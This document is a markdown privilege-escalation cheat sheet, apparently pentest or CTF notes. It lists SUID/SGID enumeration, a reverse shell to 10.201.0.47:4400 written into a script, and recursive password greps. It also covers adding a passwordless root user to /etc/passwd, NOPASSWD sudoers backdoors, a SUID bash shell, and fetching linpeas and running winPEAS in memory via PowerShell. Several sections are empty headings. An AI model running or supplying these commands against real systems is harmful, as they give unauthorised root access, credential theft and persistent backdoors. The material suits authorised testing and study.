# Linux :
___________________________________________________________________________________________________________

## Take advantage to the SUID / SGID

find binary files that can be used with root user rights
```bash
find / -perm -04000 2>/dev/null
```
find binary files that can be used with the rights of the group to which it is associated
```bash
find / -perm -2000 2>/dev/null
```
or
```bash
sudo -l
```
-----------------------------------------------------------------------------------------------------------------
## OPT verify script 
with good permission, write into the script :
```bash
echo '#!/bin/bash' > script.sh
echo "sh -i >& /dev/tcp/10.201.0.47/4400 0>&1" >> script.sh
```
-----------------------------------------------------------------------------------------------------------------
## Looking for password
```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
``` 
### check for old password
```bash
/etc/security/opasswd
```
-----------------------------------------------------------------------------------------------------------------
## Cron Jobs
Verify if you have write permission on these files :
```bash
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root
----
crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

## Writable /etc/passwd
Generate a password :
```bash
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Add a user and add the password :
```bash
USER:PASSWORD:0:0:USER:/root:/bin/bash
```
or 
```bash
echo 'user::0:0::/root:/bin/bash' >>/etc/passwd
su - user
```
## Writable Sudoers file
```bash
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
```
use SUDO without password
```bash
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```
-----------------------------------------------------------------------------------------------------------------
## Take advantage to the sticky Bit
for exemple, into a script, write 'chmod +s /bin/bash' and send the next command
```bash
chmod +s /bin/bash
/bin/bash -p
```

-----------------------------------------------------------------------------------------------------------------
## Unsecure SUDO
-----------------------------------------------------------------------------------------------------------------
## Ret2libc

-----------------------------------------------------------------------------------------------------------------

# Windows : 
___________________________________________________________________________________________________________
## Cpassword

------------------------------------------------------------------------------------------------------------------------

# TOOLS
## Linux
### Linpeas
```bash
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
```
### LineEnum
```bash
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```
### Linux smart enumeration
```bash
curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh
```

## Windows
### Winpeas
```powershell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```


















